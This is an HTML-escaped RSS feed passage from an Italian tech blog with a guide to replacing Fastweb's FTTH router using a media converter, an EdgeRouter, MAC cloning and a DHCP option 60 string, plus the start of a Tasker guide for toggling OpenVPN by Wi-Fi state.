-&lt;p&gt;Con l’entrata in vigore della delibera AGCOM n. 348/18/CONS sul modem libero, gli operatori di rete fissa sono stati obbligati a rilasciare tutti i parametri relativi alla corretta configurazione di un modem alternativo a quello fornito dall&amp;rsquo;operatore.&lt;/p&gt;
-&lt;p&gt;Purtroppo la realtà dei fatti è che non tutti gli operatori hanno risposto in modo efficiente. Tra questi c&amp;rsquo;è Fastweb che ha interpretato &amp;ldquo;a modo suo&amp;rdquo; la delibera, soprattutto in ambito FTTH.&lt;/p&gt;
-&lt;p&gt;Se andiamo a leggere nella &lt;a href=&#34;https://www.fastweb.it/adsl-fibra-ottica/dettagli/altri-modem/&#34;&gt;pagina dedicata alla delibera&lt;/a&gt; sul sito di Fastweb, si legge:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Nel caso di &lt;strong&gt;Fibra&lt;/strong&gt;, l&amp;rsquo;apparato scelto dal cliente alternativo al FASTGate deve essere collegato alla terminazione ottica (ONT) fornita da Fastweb mediante un cavo di rete Ethernet Categoria 5e o superiore alla porta WAN Ethernet.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Insomma, non proprio chiarissimo. Ma soprattutto, se oggi prendete il vostro bel cavo in fibra ottica, prendete il vostro modem router e lo collegate al posto del FASTGate fornito da Fastweb, usando solo le informazioni riportate sul sito, il risultato è che non succede proprio nulla.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Fastweb ha mentito? Non direi&lt;/strong&gt;. Diciamo che ha omesso tipo quelle due o tre informazioni utili a far funzionare il tutto. Nel momento in cui vi scrivo infatti è possibile usare un router alternativo al FASTGate, a patto di spendere qualche soldino e rispettare un po&amp;rsquo; di requisiti tecnici.&lt;/p&gt;
-&lt;h2 id=&#34;requisiti&#34;&gt;
-  Requisiti
-  &lt;a href=&#34;#requisiti&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Partiamo da quel poco che ci dice Fastweb, ovvero che &lt;em&gt;&amp;ldquo;l&amp;rsquo;apparato [&amp;hellip;] deve essere collegato alla terminazione ottica (ONT) [&amp;hellip;] con un cavo di rete [&amp;hellip;] alla porta WAN&amp;rdquo;&lt;/em&gt;.&lt;/p&gt;
-&lt;p&gt;L&amp;rsquo;ONT fornita da Fastweb è quella piccola terminazione di metallo che collega il cavo in fibra ottica direttamente al router.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/IMG_20190403_224147.resized.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Questo piccolo stick è un trasmettitore che invia e riceve segnali luminosi sulla fibra ottica e li trasforma in impulsi elettrici, interpretabili dal router. L&amp;rsquo;ONT va collegato alla porta WAN del router con un cavo di rete, quindi&amp;hellip; serve un &lt;strong&gt;convertitore&lt;/strong&gt;!&lt;/p&gt;
-&lt;h3 id=&#34;tp-link-mediaconverter-mc220l&#34;&gt;
-  TP-Link MediaConverter MC220L
-  &lt;a href=&#34;#tp-link-mediaconverter-mc220l&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;L&amp;rsquo;MC220L di TP-Link è attualmente il miglior MediaConverter che potete acquistare per questo caso d&amp;rsquo;uso. Il costo è inferiore ai 30 euro.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/image-1.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;TP-Link MediaConverter MC220L&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;È un dispositivo abbastanza stupido nel suo funzionamento. Ha due porte: in una ci mettete la ONT di Fastweb, nell&amp;rsquo;altra ci mettete il cavo di rete che va al vostro router. Fine. Non ha setup, non ha IP, non ha pagine di configurazioni.&lt;/p&gt;
-&lt;p&gt;Secondo Fastweb, dovrebbe essere finita qui (lol). In pratica, manca un enorme dettaglio, ovvero quali parametri inserire nella porta WAN del router che andremo ad usare.&lt;/p&gt;
-&lt;h3 id=&#34;scelta-del-router&#34;&gt;
-  Scelta del router&amp;hellip;
-  &lt;a href=&#34;#scelta-del-router&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Se state già pensando di usare il vostro Netgear di 10 anni fa o il TP-Link da 15 euro comprato al Black-Friday, scordatevelo! &lt;strong&gt;Il primo requisito&lt;/strong&gt; del router da usare per sostituire il FASTGate è che sia &lt;strong&gt;performante&lt;/strong&gt;, perché deve essere in grado di gestire un traffico NAT WAN-to-LAN di 1Gbps.&lt;/p&gt;
-&lt;p&gt;Ebbene sì, benvenuti nel magico mondo delle connessioni domestiche ultra-veloci, dove anche in casa servono router carrozzati e performanti per poter sfruttare tutta la banda offerta dal provider.&lt;/p&gt;
-&lt;p&gt;Se volete sapere a grandi linee le performance del router che avete o che volete acquistare, potete fare riferimento a questa tabella comparativa di SmallNetBuilder:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.smallnetbuilder.com/tools/charts/router/bar/179-wan-to-lan-tcp/35&#34;&gt;https://www.smallnetbuilder.com/tools/charts/router/bar/179-wan-to-lan-tcp/35&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Questo però non è l&amp;rsquo;unico requisito che il router deve rispettare. Ce n&amp;rsquo;è un altro, che è fondamentale.&lt;/p&gt;
-&lt;h3 id=&#34;con-supporto-dhcp-option-60-sulla-wan&#34;&gt;
-  &amp;hellip;con supporto dhcp option 60 sulla WAN
-  &lt;a href=&#34;#con-supporto-dhcp-option-60-sulla-wan&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Per sostituire il FASTGate con un router qualsiasi e far sì che funzioni, quest&amp;rsquo;ultimo deve &amp;ldquo;annunciarsi&amp;rdquo; come se fosse il FASTGate. Per fare questa cosa, occorre impostare alcuni &lt;strong&gt;parametri personalizzati&lt;/strong&gt; nel dhcp-client della WAN, ovvero il servizio che richiede l&amp;rsquo;IP al provider in fase di connessione.&lt;/p&gt;
-&lt;p&gt;Nello specifico il parametro da configurare è l&amp;rsquo;Option 60 &lt;code&gt;vendor-class-identifier&lt;/code&gt; del dhcp.&lt;/p&gt;
-&lt;p&gt;Ecco, questa non è una cosa proprio diffusa. È difficile trovare dei router ad uso consumer con questa opzione configurabile. In genere tutto ciò che è basato su OpenWRT e similari e/o ha una CLI, ha la possibilità di abilitare questo parametro. Non vorrei dirvi una stupidata ma gli ultimissimi Netgear consumer di fascia alta (300+ euro) dovrebbero supportare questi parametri, ma non fidatevi di me. Verificate.In genere queste opzioni sono facilmente configurabili su router SOHO/professionali tipo MikroTik, Ubiquiti EdgeRouter, tutto ciò che è basato su OpenWRT, pfSense, etc&amp;hellip;&lt;/p&gt;
-&lt;h3 id=&#34;recap-dei-requisiti&#34;&gt;
-  Recap dei requisiti
-  &lt;a href=&#34;#recap-dei-requisiti&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Quindi, punto elenco rapido di quello che serve:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Un MediaConverter per collegare la ONT originale fornita da Fastweb&lt;/li&gt;
-&lt;li&gt;Un router performante&amp;hellip;&lt;/li&gt;
-&lt;li&gt;&amp;hellip;che supporti la dhcp option 60 (vendor class identifier) sulla WAN&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Detto ciò, vediamo nel concreto.&lt;/p&gt;
-&lt;h2 id=&#34;tempo-di-spendere-soldi-e-collegare-due-cavi&#34;&gt;
-  Tempo di spendere soldi e collegare due cavi
-  &lt;a href=&#34;#tempo-di-spendere-soldi-e-collegare-due-cavi&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Per il mio setup ho scelto di riciclare un vecchio Ubiquiti EdgeRouter-Lite che avevo nel cassetto. Per mia fortuna è un router che supporta tutti i parametri che servono e grazie all&amp;rsquo;accelerazione hardware riesce tranquillamente a gestire un throughput di 1 Gbps. Non ha il WiFi, ma per quello avevo già intenzione di prendermi un UniFi nanoHD, che per l&amp;rsquo;occasione ho acquistato insieme al MediaConverter.&lt;/p&gt;
-&lt;p&gt;
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/MVIMG_20190329_132819.resized.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/MVIMG_20190329_132649.resized.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-&lt;/p&gt;
-&lt;h3 id=&#34;colleghiamo-i-cavi&#34;&gt;
-  Colleghiamo i cavi
-  &lt;a href=&#34;#colleghiamo-i-cavi&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Iniziamo quindi a &lt;strong&gt;sfilare l&amp;rsquo;ONT dal FASTGate&lt;/strong&gt;. Prima di procedere con questa operazione, vi consiglio di spegnere il router e lasciarlo spento per qualche minuto. L&amp;rsquo;ONT infatti si &lt;strong&gt;surriscalda molto&lt;/strong&gt; e c&amp;rsquo;è il rischio di scottarsi durante le operazioni.&lt;/p&gt;
-&lt;p&gt;Ricollegate quindi il tutto nel MediaConverter. Prima di collegare il cavo di rete al router però, dobbiamo configurare i parametri sulla WAN.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/IMG_20190403_000923.resized.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h3 id=&#34;impostare-i-parametri-sulla-wan-del-router&#34;&gt;
-  Impostare i parametri sulla WAN del router
-  &lt;a href=&#34;#impostare-i-parametri-sulla-wan-del-router&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;La prima cosa da fare&lt;/strong&gt; è impostare l&amp;rsquo;interfaccia in modalità DHCP, in modo da prendersi automaticamente l&amp;rsquo;IP dal provider in fase di connessione. Questo è un setup praticamente standard che hanno tutti i router.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;La seconda cosa da fare&lt;/strong&gt; è clonare il MAC address del FASTGate. Il MAC Address è scritto sulla destra di un&amp;rsquo;etichetta dietro il FASTGate.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/MVIMG_20190403_203840.resized.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Per impostare il MAC sulla WAN nel EdgeRouter è possibile farlo da CLI, oppure andando nella tab Config Tree dell&amp;rsquo;interfaccia web e navigare fino a &lt;code&gt;interfaces / ethernet / eth0&lt;/code&gt;, inserendo poi il MAC nell&amp;rsquo;apposito campo, facendo attenzione ad inserirlo nel formato &lt;code&gt;00:00:00:00:00:00&lt;/code&gt;.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/Schermata-da-2019-04-03-20-50-46_450112b1995490a1e086956374eb0845.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Confermate la configurazione con &lt;code&gt;Preview&lt;/code&gt; e &lt;code&gt;Apply&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;La terza cosa da fare&lt;/strong&gt; è impostare il parametro DHCP Option 60. Per impostarlo possiamo sempre andare da CLI, oppure anche qui possiamo modificare le proprietà dal &lt;strong&gt;Config Tree&lt;/strong&gt;. Navighiamo fino a &lt;code&gt;interfaces / ethernet / eth0 / dhcp-options&lt;/code&gt; e nel campo &lt;strong&gt;client-option&lt;/strong&gt; dobbiamo inserire questa stringa esatta:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;send vendor-class-identifier &amp;amp;quot;askey_HW_ES1_SW_0.00.67/dslforum.org&amp;amp;quot;;&lt;/code&gt;&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/Schermata-da-2019-04-03-20-56-57_2e6aafa7f4b30c73220b551db0b42e5a.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Confermate sempre con &lt;code&gt;Preview&lt;/code&gt; e &lt;code&gt;Apply&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;NOTA IMPORTANTE&lt;/strong&gt;: la stringa esatta da inserire dovrebbe essere &lt;code&gt;send vendor-class-identifier &amp;quot;askey_HW_ES1_SW_0.00.67/dslforum.org&amp;quot;;&lt;/code&gt; tuttavia l&amp;rsquo;EdgeRouter restituisce un errore se si usano gli &amp;quot; nella stringa, quindi li ho sostituiti con &lt;code&gt;&amp;amp;quot;&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;A questo punto, dovrebbe essere tutto pronto.&lt;/p&gt;
-&lt;h3 id=&#34;test-drive&#34;&gt;
-  Test Drive
-  &lt;a href=&#34;#test-drive&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Colleghiamo il cavo di rete alla porta WAN del nostro router.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/IMG_20190403_001118.resized.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;I LED sul MediaConverter dovrebbero accendersi e nel giro di qualche secondo il router dovrebbe effettuare la connessione.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Schermata-da-2019-03-31-16-02-01.resized.jpg&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Connected! Velocità di download molto vicina alla nominale da contratto.&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Fate un test di navigazione e se avete fatto tutto correttamente dovrebbe funzionare tutto!&lt;/p&gt;
-&lt;p&gt;A questo punto potete prendere il vostro FASTGate e fargli fare la fine che merita&amp;hellip;&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/MVIMG_20190331_180053.resized.jpg&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h2 id=&#34;conclusioni&#34;&gt;
-  Conclusioni
-  &lt;a href=&#34;#conclusioni&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Come avete visto, sostituire il router fornito da Fastweb è possibile, tuttavia è un&amp;rsquo;operazione non alla portata di tutti. Richiede un hardware comunque al pari se non superiore al FASTGate (che tecnicamente schifo non fa) e un minimo di competenze tecniche e di networking per destreggiarsi tra collegamenti di rete e stringhe strane.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;A questo punto però, a molti di voi verrà spontanea una domanda: perché sostituire il router del provider con un router di proprietà? Cosa si guadagna? Il FASTGate non va bene?&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Ebbene, non è tanto l&amp;rsquo;hardware il problema in questo caso, ma il software.&lt;/p&gt;
-&lt;p&gt;Il software che gestisce questi router infatti è sviluppato su misura dal provider stesso e generalmente è un&amp;rsquo;accozzaglia di codice scritto male e senza criterio. Come risultato si ottiene un firmware con poche funzioni, spesso basilari e quelle poche funzioni avanzate che ci sono hanno bug assurdi che ne compromettono il corretto funzionamento.&lt;/p&gt;
-&lt;p&gt;Un esempio? Il famoso caso di Destiny e il router &amp;ldquo;scolapasta&amp;rdquo; di TIM:&lt;br&gt;
-&lt;a href=&#34;https://www.bungie.net/it/Forums/Post/242575705&#34;&gt;https://www.bungie.net/it/Forums/Post/242575705&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;A questo punto qualcuno dirà&amp;hellip; vabbé ma io devo solo navigare sull&amp;rsquo;internetto, cosa me ne frega di tutto il resto? Non posso stare col mio bel router che collego e funziona?&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Sì, certamente, però qui entriamo nel secondo problema di questi router, a parer mio il più grave e che riguarda praticamente il 100% degli utenti: la sicurezza e la privacy.&lt;/p&gt;
-&lt;p&gt;Come sicuramente saprete, questi router dei provider sono famosi per essere &lt;strong&gt;telegestiti&lt;/strong&gt;, ovvero il provider può tecnicamente entrare nel vostro router e apportare modifiche da remoto. Queste modifiche generalmente sono aggiornamenti firmware, e fin qui nulla di male, però non si limitano a questo: possono tecnicamente modificare il funzionamento del router, estrapolare informazioni e vedere quello che c&amp;rsquo;è all&amp;rsquo;interno della vostra rete domestica, vedere i vostri dispositivi, vedere se avete un iPhone, un Android, un Roomba, una telecamera, e così via.&lt;/p&gt;
-&lt;p&gt;Se si considera la rete locale come le quattro mura di casa, è come se il vostro fornitore del gas venisse a casa vostra a vedere cosa state cucinando sui fornelli tutte le sere. Non solo, volendo ha la possibilità di decidere arbitrariamente di regolarvi la potenza della fiamma. Non suona come una bella cosa, vero?&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Però anche qui, sono quasi certo che qualcuno dirà &amp;ldquo;è il mio provider, sono consapevole e non ho nulla da nascondere. Mi fido!&amp;rdquo;.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Ebbene, durante questa fase di setup del nuovo router mi sono accorto per puro caso che dal mio IP pubblico con il vecchio FASTGate risultava una &lt;strong&gt;porta aperta in ingresso&lt;/strong&gt; da internet. (Premessa per i neofiti: a meno di configurazioni particolari e volute, le porte in ingresso da internet devono essere assolutamente &lt;strong&gt;chiuse&lt;/strong&gt;!)&lt;/p&gt;
-&lt;p&gt;Verificando la configurazione del FASTGate non ho trovato alcuna traccia di una configurazione che citasse questa porta, né tanto meno che fosse aperta indiscriminatamente a tutti.&lt;/p&gt;
-&lt;p&gt;Al che mi è venuto un dubbio: se non fosse solo un mio problema?&lt;/p&gt;
-&lt;p&gt;Facendo una velocissima ricerca su &lt;strong&gt;Shodan&lt;/strong&gt;, ho scoperto di non essere solo. Cercando infatti per questa porta e isolando la ricerca sul suolo italiano, di quasi 59.000 risultati, &lt;strong&gt;ben 44.000 sono di Fastweb&lt;/strong&gt; con un nettissimo distacco dal secondo posto.&lt;/p&gt;
-&lt;p&gt;
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/Schermata-da-2019-04-03-22-10-17-1.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/Schermata-da-2019-04-03-22-10-39_2c33668b1461ab69de2885337110f5e9-2.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-&lt;/p&gt;
-&lt;p&gt;Abbiamo quindi una situazione dove il router telegestito e controllato dal provider espone su internet un servizio del router non chiaramente identificato, aperto a tutti, in modo assolutamente silente, lasciando quindi il cliente ignaro della situazione di potenziale pericolo.&lt;/p&gt;
-&lt;p&gt;Il rischio, seppur remoto, è che qualcuno possa tentare di sfruttare delle potenziali vulnerabilità del servizio esposto, prendendo così il controllo dell&amp;rsquo;apparato e accedere così all&amp;rsquo;interno della vostra rete. Se mettiamo insieme anche il fatto che spesso il firmware di questi router è scritto coi piedi, il rischio di subire una violazione non sembra poi così remoto.&lt;/p&gt;
-&lt;p&gt;Ed ecco quindi che il provider, di cui vi fidate, può commettere degli errori e mettere in pericolo la vostra sicurezza e la vostra privacy.&lt;/p&gt;
-&lt;p&gt;Quindi, tornando alla domanda originale, perché sostituire il router del provider con un router proprietario?&lt;/p&gt;
-&lt;p&gt;La risposta è molto semplice:&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;PRIVACY.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;SICUREZZA.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;LIBERTÀ.&lt;/strong&gt;&lt;/p&gt;
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Automatizzare la connessione VPN con Tasker per Android</title>
-      <link>/post/automatizzare-la-connessione-vpn-con-tasker-per-android/</link>
-      <pubDate>Sun, 25 Nov 2018 17:19:34 +0000</pubDate>
-      
-      <guid>/post/automatizzare-la-connessione-vpn-con-tasker-per-android/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/pihole1-1-1-.jpeg&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Da quando ho iniziato ad usare le VPN sul telefono mi sono accorto di un problema di semplice natura: ricordarmi di attivarla quando esco di casa. Spesse volte mi è capitato infatti di ricordarmene solo dopo qualche ora passata fuori casa, o ancora peggio accorgermi della mancanza di un filtro sulla navigazione quando ormai avevo già vinto 4 iPad e 9 iPhone X.&lt;/p&gt;
-&lt;p&gt;L&amp;rsquo;idea mi è quindi balzata in testa: perché non automatizzare la connessione VPN appena mi allontano dal WiFi di casa? Viceversa, appena torno a casa la VPN si deve disconnettere.&lt;/p&gt;
-&lt;p&gt;Ebbene, grazie a Tasker e il client OpenVPN for Android è possibile farlo!&lt;/p&gt;
-&lt;p&gt;Questa breve guida fa seguito alla mia guida iniziale su &lt;a href=&#34;__GHOST_URL__/virtual-private-pi-holed-network/&#34;&gt;come realizzare una VPN domestica con Pi-Hole integrato&lt;/a&gt; da poter utilizzare fuori casa per navigare sicuri e protetti in mobilità.&lt;/p&gt;
-&lt;h2 id=&#34;tasker-per-android&#34;&gt;
-  Tasker per Android
-  &lt;a href=&#34;#tasker-per-android&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Tasker è un&amp;rsquo;app per Android che permette di eseguire delle automazioni in base a determinate condizioni. La trovate nel &lt;a href=&#34;https://play.google.com/store/apps/details?id=net.dinglisch.android.taskerm&#34;&gt;Play Store&lt;/a&gt; ad un costo di 2.99 €.&lt;/p&gt;
-&lt;p&gt;Il principio di funzionamento di Tasker è molto semplice:&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;SE&lt;/strong&gt; [CONDIZIONE DA RISPETTARE] &lt;strong&gt;È VERO, ALLORA&lt;/strong&gt; [ESEGUI ATTIVITÀ]&lt;/p&gt;
-&lt;p&gt;In Tasker le &amp;ldquo;condizioni da rispettare&amp;rdquo; si chiamano &lt;strong&gt;Profili&lt;/strong&gt;. Ogni &lt;strong&gt;Attività&lt;/strong&gt; può contenere una o più &lt;strong&gt;Azioni&lt;/strong&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;automatic-virtual-private-pi-holed-network&#34;&gt;
-  AUTOMATIC Virtual Private Pi-Holed Network
-  &lt;a href=&#34;#automatic-virtual-private-pi-holed-network&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;La logica con cui ho creato l&amp;rsquo;automazione è la seguente:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;SE&lt;/strong&gt; [WiFi non connesso] &lt;strong&gt;È VERO, ALLORA&lt;/strong&gt; [Connetti VPN]&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;SE&lt;/strong&gt; [WiFi di casa connesso] &lt;strong&gt;È VERO, ALLORA&lt;/strong&gt; [Disconnetti VPN]&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;La realizzazione è abbastanza semplice, vediamola insieme.&lt;/p&gt;
-&lt;h2 id=&#34;creiamo-le-attività-start-vpn-e-stop-vpn&#34;&gt;
-  Creiamo le attività &amp;ldquo;Start VPN&amp;rdquo; e &amp;ldquo;Stop VPN&amp;rdquo;
-  &lt;a href=&#34;#creiamo-le-attivit%c3%a0-start-vpn-e-stop-vpn&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Iniziamo con la creazione delle due attività di connessione e disconnessione della VPN.&lt;/p&gt;
-&lt;h3 id=&#34;start-vpn&#34;&gt;
-  Start VPN
-  &lt;a href=&#34;#start-vpn&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Apriamo Tasker e posizioniamoci sulla tab &lt;strong&gt;Attività&lt;/strong&gt;, dopodiché premiamo &lt;strong&gt;+&lt;/strong&gt;, scriviamo &lt;strong&gt;&amp;ldquo;Start VPN&amp;rdquo;&lt;/strong&gt; e poi confermiamo.&lt;/p&gt;
-&lt;p&gt;A questo punto possiamo andare ad inserire una o più azioni che verranno eseguite quando verrà avviata questa attività, noi dobbiamo connettere il nostro profilo VPN salvato in OpenVPN for Android.&lt;/p&gt;
-&lt;p&gt;Per farlo, premiamo &lt;strong&gt;+&lt;/strong&gt; e scegliamo &lt;strong&gt;Sistema&lt;/strong&gt; e &lt;strong&gt;Invia Intent&lt;/strong&gt;. Vi apparirà un form dove bisogna inserire dei valori. I valori da inserire sono questi:&lt;/p&gt;
-&lt;p&gt;Azione&lt;br&gt;
-&lt;code&gt;android.intent.action.MAIN&lt;/code&gt;&lt;br&gt;
-Cat&lt;br&gt;
-&lt;code&gt;None&lt;/code&gt;&lt;br&gt;
-Extra (dove &amp;ldquo;Casa&amp;rdquo; è il nome del vostro profilo VPN)&lt;br&gt;
-&lt;code&gt;de.blinkt.openvpn.shortcutProfileName: Casa&lt;/code&gt;&lt;br&gt;
-Pacchetto&lt;br&gt;
-&lt;code&gt;de.blinkt.openvpn&lt;/code&gt;&lt;br&gt;
-Classe&lt;br&gt;
-&lt;code&gt;de.blinkt.openvpn.LauchVPN&lt;/code&gt;&lt;br&gt;
-Target&lt;br&gt;
-&lt;code&gt;Activity&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Ora torniamo indietro fino al pannello principale delle attività.&lt;/p&gt;
-&lt;h3 id=&#34;stop-vpn&#34;&gt;
-  Stop VPN
-  &lt;a href=&#34;#stop-vpn&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Creiamo la seconda attività per disconnettere la VPN sempre seguendo la stessa procedura con &lt;strong&gt;+&lt;/strong&gt;, scriviamo &lt;strong&gt;&amp;ldquo;Stop VPN&amp;rdquo;&lt;/strong&gt; e confermiamo.&lt;/p&gt;
-&lt;p&gt;Di nuovo qui facciamo &lt;strong&gt;+&lt;/strong&gt;, &lt;strong&gt;Sistema&lt;/strong&gt;, &lt;strong&gt;Invia Intent&lt;/strong&gt; e scriviamo questi parametri:&lt;/p&gt;
-&lt;p&gt;Azione&lt;br&gt;
-&lt;code&gt;android.intent.action.MAIN&lt;/code&gt;&lt;br&gt;
-Cat&lt;br&gt;
-&lt;code&gt;None&lt;/code&gt;&lt;br&gt;
-Extra (dove &amp;ldquo;Casa&amp;rdquo; è il nome del vostro profilo VPN)&lt;br&gt;
-&lt;code&gt;de.blinkt.openvpn.shortcutProfileName: Casa&lt;/code&gt;&lt;br&gt;
-Pacchetto&lt;br&gt;
-&lt;code&gt;de.blinkt.openvpn&lt;/code&gt;&lt;br&gt;
-Classe&lt;br&gt;
-&lt;code&gt;de.blinkt.openvpn.api.DisconnectVPN&lt;/code&gt;&lt;br&gt;
-Target&lt;br&gt;
-&lt;code&gt;Activity&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Torniamo di nuovo indietro alla home e se avete fatto tutto giusto, dovreste ritrovarvi con due Attività: &lt;strong&gt;&amp;ldquo;Start VPN&amp;rdquo;&lt;/strong&gt; e &lt;strong&gt;&amp;ldquo;Stop VPN&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;creazione-dei-profili-wifi-collegato-e-non-wifi-collegato&#34;&gt;
-  Creazione dei profili &amp;ldquo;WIFI Collegato&amp;rdquo; e &amp;ldquo;Non WIFI Collegato&amp;rdquo;
-  &lt;a href=&#34;#creazione-dei-profili-wifi-collegato-e-non-wifi-collegato&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Ora possiamo passare alla creazione dei profili.&lt;/p&gt;
-&lt;h3 id=&#34;wifi-collegato&#34;&gt;
-  WIFI Collegato
-  &lt;a href=&#34;#wifi-collegato&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Iniziamo con la creazione del profilo &lt;strong&gt;&amp;ldquo;WIFI Collegato&amp;rdquo;&lt;/strong&gt;, dobbiamo quindi dirgli di disconnettere la VPN se siamo connessi al nostro WiFi di casa.&lt;/p&gt;
-&lt;p&gt;Spostiamoci nella tab &lt;strong&gt;Profili&lt;/strong&gt;, premiamo &lt;strong&gt;+&lt;/strong&gt;, selezioniamo &lt;strong&gt;Stato&lt;/strong&gt; dal menu a scomparsa, poi &lt;strong&gt;Rete&lt;/strong&gt; e &lt;strong&gt;WIFI Collegato&lt;/strong&gt;.&lt;/p&gt;
